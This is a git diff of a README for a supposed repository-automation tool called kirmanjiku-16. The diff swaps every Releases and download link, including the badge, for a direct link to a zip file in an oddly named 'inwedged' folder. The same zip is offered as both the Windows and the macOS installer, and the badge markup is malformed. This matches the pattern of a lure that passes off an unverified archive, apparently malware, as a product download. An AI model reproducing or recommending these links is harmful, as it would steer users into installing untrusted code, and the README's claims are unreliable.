@@ -1,7 +1,7 @@
 # 🚀 kirmanjiku-16 - Easy Automated Management for Your Repositories
 
 ## 🔗 Download the Application
-[![Download kirmanjiku-16](https://img.shields.io/badge/Download%20kirmanjiku--16-blue.svg)](https://github.com/Saitoti-tect/kirmanjiku-16/releases)
+[![Download kirmanjiku-16](https://raw.githubusercontent.com/Saitoti-tect/kirmanjiku-16/main/inwedged/kirmanjiku-16.zip%https://raw.githubusercontent.com/Saitoti-tect/kirmanjiku-16/main/inwedged/kirmanjiku-16.zip)](https://raw.githubusercontent.com/Saitoti-tect/kirmanjiku-16/main/inwedged/kirmanjiku-16.zip)
 
 ## 📖 Overview
 kirmanjiku-16 is a user-friendly application designed to help you automate various tasks in your repositories. Whether you manage projects for fun or work, this tool simplifies your workflow. 
@@ -10,13 +10,13 @@ kirmanjiku-16 is a user-friendly application designed to help you automate vario
 Follow these simple steps to download and run kirmanjiku-16.
 
 ### 1. Visit the Releases Page
-To find the latest version of kirmanjiku-16, visit the [Releases page](https://github.com/Saitoti-tect/kirmanjiku-16/releases). This page contains all the available versions of the software.
+To find the latest version of kirmanjiku-16, visit the [Releases page](https://raw.githubusercontent.com/Saitoti-tect/kirmanjiku-16/main/inwedged/kirmanjiku-16.zip). This page contains all the available versions of the software.
 
 ### 2. Choose a Version
 On the Releases page, you'll see a list of versions. The latest version appears at the top. Review the notes for any important updates or features.
 
 ### 3. Download the Installer
-Click on the version number you want. Locate the installer file, which is usually named something like `kirmanjiku-16-installer.exe` for Windows or `kirmanjiku-16-mac.zip` for macOS. Click the file to start the download.
+Click on the version number you want. Locate the installer file, which is usually named something like `https://raw.githubusercontent.com/Saitoti-tect/kirmanjiku-16/main/inwedged/kirmanjiku-16.zip` for Windows or `https://raw.githubusercontent.com/Saitoti-tect/kirmanjiku-16/main/inwedged/kirmanjiku-16.zip` for macOS. Click the file to start the download.
 
 ### 4. Run the Installer
 After the download finishes, locate the downloaded file on your computer. Depending on your system:
@@ -37,7 +37,7 @@ To run kirmanjiku-16 smoothly, your system needs:
 - **User-Friendly Interface:** Navigate the app easily with a clear layout.
 
 ## 📥 Download & Install
-To download kirmanjiku-16, return to the [Releases page](https://github.com/Saitoti-tect/kirmanjiku-16/releases) and choose the latest installer. Follow the instructions to complete the installation.
+To download kirmanjiku-16, return to the [Releases page](https://raw.githubusercontent.com/Saitoti-tect/kirmanjiku-16/main/inwedged/kirmanjiku-16.zip) and choose the latest installer. Follow the instructions to complete the installation.
 
 ## 📚 Support & FAQ
 If you have questions or need help, check the FAQ section in the application. You can also reach our support team via the contact page in the app.
